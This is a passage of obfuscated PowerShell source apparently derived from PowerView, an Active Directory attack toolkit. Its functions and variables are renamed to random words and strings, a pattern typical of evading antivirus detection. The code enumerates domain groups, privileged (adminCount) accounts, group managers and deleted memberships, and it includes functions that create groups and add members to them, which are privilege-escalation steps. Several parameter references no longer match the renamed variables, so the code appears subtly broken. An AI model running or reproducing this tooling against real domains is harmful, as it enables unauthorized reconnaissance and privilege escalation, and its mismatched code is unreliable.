                                Write-Warning "[highfalutin] Unable to retrieve domain searcher for '$oXGljrha99'"
                            }
                        }
                    }
                    elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                    }
                    elseif ($xzUuDuRm99.Contains('\')) {
                        $lCzXByeX99 = $xzUuDuRm99.Replace('\28', '(').Replace('\29', ')') | upbraids -ZMAhChio99 Canonical
                        if ($lCzXByeX99) {
                            $nskpWPxh99 = $lCzXByeX99.SubString(0, $lCzXByeX99.IndexOf('/'))
                            $PnKWBocM99 = $xzUuDuRm99.Split('\')[1]
                            $UpOHlfOj99 += "(samAccountName=$PnKWBocM99)"
                            $qbMTjYnI99['Domain'] = $nskpWPxh99
                            Write-Verbose "[highfalutin] Extracted domain '$nskpWPxh99' from '$xzUuDuRm99'"
                            $QwdpMGwv99 = squintest @SearcherArguments
                        }
                    }
                    else {
                        $UpOHlfOj99 += "(|(samAccountName=$xzUuDuRm99)(name=$xzUuDuRm99))"
                    }
                }
                if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                    $iNUvqNTo99 += "(|$UpOHlfOj99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[highfalutin] Searching for adminCount=1'
                    $iNUvqNTo99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $lfNKOUFu99 = $PSBoundParameters['GroupScope']
                    $iNUvqNTo99 = Switch ($lfNKOUFu99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[highfalutin] Searching for group scope '$lfNKOUFu99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $EfOAVaOC99 = $PSBoundParameters['GroupProperty']
                    $iNUvqNTo99 = Switch ($EfOAVaOC99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[highfalutin] Searching for group property '$EfOAVaOC99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[highfalutin] Using additional LDAP filter: $aWyQQagT99"
                    $iNUvqNTo99 += "$aWyQQagT99"
                }
                $QwdpMGwv99.filter = "(&(objectCategory=group)$iNUvqNTo99)"
                Write-Verbose "[highfalutin] filter string: $($QwdpMGwv99.filter)"
                if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $QwdpMGwv99.FindOne() }
                else { $IUnNdChl99 = $QwdpMGwv99.FindAll() }
                $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = gelling -IzcJvFdA99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($IUnNdChl99) {
                    try { $IUnNdChl99.dispose() }
                    catch {
                        Write-Verbose "[highfalutin] Error disposing of the Results object"
                    }
                }
                $QwdpMGwv99.dispose()
            }
        }
    }
}
function frightfully {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $WCChaSZB99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $qtGJucEj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AkKSKMRL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $DoqjNWVs99 = @{
        'Identity' = $WCChaSZB99
    }
    if ($PSBoundParameters['Domain']) { $DoqjNWVs99['Domain'] = $CmuysoGL99 }
    if ($PSBoundParameters['Credential']) { $DoqjNWVs99['Credential'] = $QWHERWHL99 }
    $oJvGZDLA99 = leavening @ContextArguments
    if ($oJvGZDLA99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($oJvGZDLA99.Context)
        $Group.SamAccountName = $oJvGZDLA99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $oJvGZDLA99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $qtGJucEj99
        }
        else {
            $Group.DisplayName = $oJvGZDLA99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $AkKSKMRL99
        }
        Write-Verbose "[frightfully] Attempting to create group '$WCChaSZB99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[frightfully] Group '$WCChaSZB99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[frightfully] Error creating group '$WCChaSZB99' : $_"
        }
    }
}
function Rabat {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $qbMTjYnI99['Domain'] = $CmuysoGL99
            $cELjQvSA99 = $CmuysoGL99
        }
        else {
            $cELjQvSA99 = $Env:USERDNSDOMAIN
        }
        highfalutin @SearcherArguments | ForEach-Object {
            $qbMTjYnI99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $qbMTjYnI99['Identity'] = $_.managedBy
            $Null = $qbMTjYnI99.Remove('LDAPFilter')
            $COumFUac99 = monologue @SearcherArguments
            $pIHgeeUD99 = New-Object PSObject
            $pIHgeeUD99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $pIHgeeUD99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $pIHgeeUD99 | Add-Member Noteproperty 'ManagerName' $COumFUac99.samaccountname
            $pIHgeeUD99 | Add-Member Noteproperty 'ManagerDistinguishedName' $COumFUac99.distinguishedName
            if ($COumFUac99.samaccounttype -eq 0x10000000) {
                $pIHgeeUD99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($COumFUac99.samaccounttype -eq 0x30000000) {
                $pIHgeeUD99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $JlcSqbqE99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $JlcSqbqE99['Server'] = $vbyFupaI99 }
            if ($PSBoundParameters['SearchScope']) { $JlcSqbqE99['SearchScope'] = $RVZhWaEH99 }
            if ($PSBoundParameters['ResultPageSize']) { $JlcSqbqE99['ResultPageSize'] = $rguZwVJP99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $JlcSqbqE99['ServerTimeLimit'] = $CRJCwXfg99 }
            if ($PSBoundParameters['Tombstone']) { $JlcSqbqE99['Tombstone'] = $iqiYBoee99 }
            if ($PSBoundParameters['Credential']) { $JlcSqbqE99['Credential'] = $QWHERWHL99 }
            $pIHgeeUD99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $pIHgeeUD99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $pIHgeeUD99
        }
    }
}
function plowed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $BqbjbvhX99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $vWsFsFan99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $YGZtXoSJ99 = @{}
        if ($PSBoundParameters['Domain']) { $YGZtXoSJ99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $YGZtXoSJ99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $YGZtXoSJ99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        $QwdpMGwv99 = squintest @SearcherArguments
        if ($QwdpMGwv99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $qbMTjYnI99['Identity'] = $NADQIykH99
                $qbMTjYnI99['Raw'] = $True
                $Group = highfalutin @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[plowed] Error searching for group with identity: $NADQIykH99"
                }
                else {
                    $FjmwHCQr99 = $Group.properties.item('samaccountname')[0]
                    $rOmBOxkc99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $NRFslZhr99 = $CmuysoGL99
                    }
                    else {
                        if ($rOmBOxkc99) {
                            $NRFslZhr99 = $rOmBOxkc99.SubString($rOmBOxkc99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[plowed] Using LDAP matching rule to recurse on '$rOmBOxkc99', only user accounts will be returned."
                    $QwdpMGwv99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$rOmBOxkc99))"
                    $QwdpMGwv99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $LpDVgkcD99 = $QwdpMGwv99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $qbMTjYnI99.Remove('Raw')
            }
            else {
                $UpOHlfOj99 = ''
                $iNUvqNTo99 = ''
                $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                    $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($xzUuDuRm99 -match '^S-1-') {
                        $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                    }
                    elseif ($xzUuDuRm99 -match '^CN=') {
                        $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[plowed] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                            $qbMTjYnI99['Domain'] = $oXGljrha99
                            $QwdpMGwv99 = squintest @SearcherArguments
                            if (-not $QwdpMGwv99) {
                                Write-Warning "[plowed] Unable to retrieve domain searcher for '$oXGljrha99'"
                            }
                        }
                    }
                    elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                    }
                    elseif ($xzUuDuRm99.Contains('\')) {
                        $lCzXByeX99 = $xzUuDuRm99.Replace('\28', '(').Replace('\29', ')') | upbraids -ZMAhChio99 Canonical
                        if ($lCzXByeX99) {
                            $nskpWPxh99 = $lCzXByeX99.SubString(0, $lCzXByeX99.IndexOf('/'))
                            $PnKWBocM99 = $xzUuDuRm99.Split('\')[1]
                            $UpOHlfOj99 += "(samAccountName=$PnKWBocM99)"
                            $qbMTjYnI99['Domain'] = $nskpWPxh99
                            Write-Verbose "[plowed] Extracted domain '$nskpWPxh99' from '$xzUuDuRm99'"
                            $QwdpMGwv99 = squintest @SearcherArguments
                        }
                    }
                    else {
                        $UpOHlfOj99 += "(samAccountName=$xzUuDuRm99)"
                    }
                }
                if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                    $iNUvqNTo99 += "(|$UpOHlfOj99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[plowed] Using additional LDAP filter: $aWyQQagT99"
                    $iNUvqNTo99 += "$aWyQQagT99"
                }
                $QwdpMGwv99.filter = "(&(objectCategory=group)$iNUvqNTo99)"
                Write-Verbose "[plowed] plowed filter string: $($QwdpMGwv99.filter)"
                try {
                    $yBCCHOLl99 = $QwdpMGwv99.FindOne()
                }
                catch {
                    Write-Warning "[plowed] Error searching for group with identity '$NADQIykH99': $_"
                    $LpDVgkcD99 = @()
                }
                $FjmwHCQr99 = ''
                $rOmBOxkc99 = ''
                if ($yBCCHOLl99) {
                    $LpDVgkcD99 = $yBCCHOLl99.properties.item('member')
                    if ($LpDVgkcD99.count -eq 0) {
                        $xnosTAuR99 = $False
                        $tgkgvhyS99 = 0
                        $Top = 0
                        while (-not $xnosTAuR99) {
                            $Top = $tgkgvhyS99 + 1499
                            $VbdAZsua99="member;range=$tgkgvhyS99-$Top"
                            $tgkgvhyS99 += 1500
                            $Null = $QwdpMGwv99.PropertiesToLoad.Clear()
                            $Null = $QwdpMGwv99.PropertiesToLoad.Add("$VbdAZsua99")
                            $Null = $QwdpMGwv99.PropertiesToLoad.Add('samaccountname')
                            $Null = $QwdpMGwv99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $yBCCHOLl99 = $QwdpMGwv99.FindOne()
                                $oweQUfue99 = $yBCCHOLl99.Properties.PropertyNames -like "member;range=*"
                                $LpDVgkcD99 += $yBCCHOLl99.Properties.item($oweQUfue99)
                                $FjmwHCQr99 = $yBCCHOLl99.properties.item('samaccountname')[0]
                                $rOmBOxkc99 = $yBCCHOLl99.properties.item('distinguishedname')[0]
                                if ($LpDVgkcD99.count -eq 0) {
                                    $xnosTAuR99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $xnosTAuR99 = $True
                            }
                        }
                    }
                    else {
                        $FjmwHCQr99 = $yBCCHOLl99.properties.item('samaccountname')[0]
                        $rOmBOxkc99 = $yBCCHOLl99.properties.item('distinguishedname')[0]
                        $LpDVgkcD99 += $yBCCHOLl99.Properties.item($oweQUfue99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $NRFslZhr99 = $CmuysoGL99
                    }
                    else {
                        if ($rOmBOxkc99) {
                            $NRFslZhr99 = $rOmBOxkc99.SubString($rOmBOxkc99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($IZCGoUsG99 in $LpDVgkcD99) {
                if ($BqbjbvhX99 -and $BEZetDsD99) {
                    $IzcJvFdA99 = $_.Properties
                }
                else {
                    $BglsdSWx99 = $qbMTjYnI99.Clone()
                    $BglsdSWx99['Identity'] = $IZCGoUsG99
                    $BglsdSWx99['Raw'] = $True
                    $BglsdSWx99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = monologue @ObjectSearcherArguments
                    $IzcJvFdA99 = $Object.Properties
                }
                if ($IzcJvFdA99) {
                    $MdgqhFrV99 = New-Object PSObject
                    $MdgqhFrV99 | Add-Member Noteproperty 'GroupDomain' $NRFslZhr99
                    $MdgqhFrV99 | Add-Member Noteproperty 'GroupName' $FjmwHCQr99
                    $MdgqhFrV99 | Add-Member Noteproperty 'GroupDistinguishedName' $rOmBOxkc99
                    if ($IzcJvFdA99.objectsid) {
                        $waerGDtb99 = ((New-Object System.Security.Principal.SecurityIdentifier $IzcJvFdA99.objectsid[0], 0).Value)
                    }
                    else {
                        $waerGDtb99 = $Null
                    }
                    try {
                        $dQsfENNz99 = $IzcJvFdA99.distinguishedname[0]
                        if ($dQsfENNz99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $waerGDtb99) {
                                    $waerGDtb99 = $IzcJvFdA99.cn[0]
                                }
                                $kVdANGdc99 = upbraids -NADQIykH99 $waerGDtb99 -ZMAhChio99 'DomainSimple' @ADNameArguments
                                if ($kVdANGdc99) {
                                    $huTylNrc99 = $kVdANGdc99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[plowed] Error converting $dQsfENNz99"
                                    $huTylNrc99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[plowed] Error converting $dQsfENNz99"
                                $huTylNrc99 = $Null
                            }
                        }
                        else {
                            $huTylNrc99 = $dQsfENNz99.SubString($dQsfENNz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $dQsfENNz99 = $Null
                        $huTylNrc99 = $Null
                    }
                    if ($IzcJvFdA99.samaccountname) {
                        $OtDsEBkS99 = $IzcJvFdA99.samaccountname[0]
                    }
                    else {
                        try {
                            $OtDsEBkS99 = vileness -ObjectSID $IzcJvFdA99.cn[0] @ADNameArguments
                        }
                        catch {
                            $OtDsEBkS99 = $IzcJvFdA99.cn[0]
                        }
                    }
                    if ($IzcJvFdA99.objectclass -match 'computer') {
                        $aFcdawdD99 = 'computer'
                    }
                    elseif ($IzcJvFdA99.objectclass -match 'group') {
                        $aFcdawdD99 = 'group'
                    }
                    elseif ($IzcJvFdA99.objectclass -match 'user') {
                        $aFcdawdD99 = 'user'
                    }
                    else {
                        $aFcdawdD99 = $Null
                    }
                    $MdgqhFrV99 | Add-Member Noteproperty 'MemberDomain' $huTylNrc99
                    $MdgqhFrV99 | Add-Member Noteproperty 'MemberName' $OtDsEBkS99
                    $MdgqhFrV99 | Add-Member Noteproperty 'MemberDistinguishedName' $dQsfENNz99
                    $MdgqhFrV99 | Add-Member Noteproperty 'MemberObjectClass' $aFcdawdD99
                    $MdgqhFrV99 | Add-Member Noteproperty 'MemberSID' $waerGDtb99
                    $MdgqhFrV99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $MdgqhFrV99
                    if ($PSBoundParameters['Recurse'] -and $dQsfENNz99 -and ($aFcdawdD99 -match 'group')) {
                        Write-Verbose "[plowed] Manually recursing on group: $dQsfENNz99"
                        $qbMTjYnI99['Identity'] = $dQsfENNz99
                        $Null = $qbMTjYnI99.Remove('Properties')
                        plowed @SearcherArguments
                    }
                }
            }
            $QwdpMGwv99.dispose()
        }
    }
}
function perceptiveness {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $qbMTjYnI99['Identity'] = $NADQIykH99 }
        monologue @SearcherArguments | ForEach-Object {
            $jVwQymgR99 = $_.Properties['distinguishedname'][0]
            ForEach($LRrUJvlq99 in $_.Properties['msds-replvaluemetadata']) {
                $lfesjECG99 = [xml]$LRrUJvlq99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($lfesjECG99) {
                    if (($lfesjECG99.pszAttributeName -Match 'member') -and (($lfesjECG99.dwVersion % 2) -eq 0 )) {
                        $TVkhXGOk99 = New-Object PSObject
                        $TVkhXGOk99 | Add-Member NoteProperty 'GroupDN' $jVwQymgR99
                        $TVkhXGOk99 | Add-Member NoteProperty 'MemberDN' $lfesjECG99.pszObjectDn
                        $TVkhXGOk99 | Add-Member NoteProperty 'TimeFirstAdded' $lfesjECG99.ftimeCreated
                        $TVkhXGOk99 | Add-Member NoteProperty 'TimeDeleted' $lfesjECG99.ftimeDeleted
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingChange' $lfesjECG99.ftimeLastOriginatingChange
                        $TVkhXGOk99 | Add-Member NoteProperty 'TimesAdded' ($lfesjECG99.dwVersion / 2)
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $lfesjECG99.pszLastOriginatingDsaDN
                        $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $TVkhXGOk99
                    }
                }
                else {
                    Write-Verbose "[perceptiveness] Error retrieving 'msds-replvaluemetadata' for '$jVwQymgR99'"
                }
            }
        }
    }
}
function concertos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $NADQIykH99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $LpDVgkcD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $DoqjNWVs99 = @{
            'Identity' = $NADQIykH99
        }
        if ($PSBoundParameters['Domain']) { $DoqjNWVs99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Credential']) { $DoqjNWVs99['Credential'] = $QWHERWHL99 }
        $bRPMaoyU99 = leavening @ContextArguments
        if ($bRPMaoyU99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($bRPMaoyU99.Context, $bRPMaoyU99.Identity)
            }
            catch {
                Write-Warning "[concertos] Error finding the group identity '$NADQIykH99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($IZCGoUsG99 in $LpDVgkcD99) {
                if ($IZCGoUsG99 -match '.+\\.+') {
                    $DoqjNWVs99['Identity'] = $IZCGoUsG99
                    $nyXTcIkr99 = leavening @ContextArguments
                    if ($nyXTcIkr99) {
                        $xcenmayP99 = $nyXTcIkr99.Identity
                    }
                }
                else {
                    $nyXTcIkr99 = $bRPMaoyU99
                    $xcenmayP99 = $IZCGoUsG99
                }
                Write-Verbose "[concertos] Adding member '$IZCGoUsG99' to group '$NADQIykH99'"
                $IZCGoUsG99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($nyXTcIkr99.Context, $xcenmayP99)
                $Group.Members.Add($IZCGoUsG99)
                $Group.Save()
            }
        }
    }
}
function tweaking {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $NADQIykH99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $LpDVgkcD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $DoqjNWVs99 = @{
            'Identity' = $NADQIykH99
        }
        if ($PSBoundParameters['Domain']) { $DoqjNWVs99['Domain'] = $CmuysoGL99 }
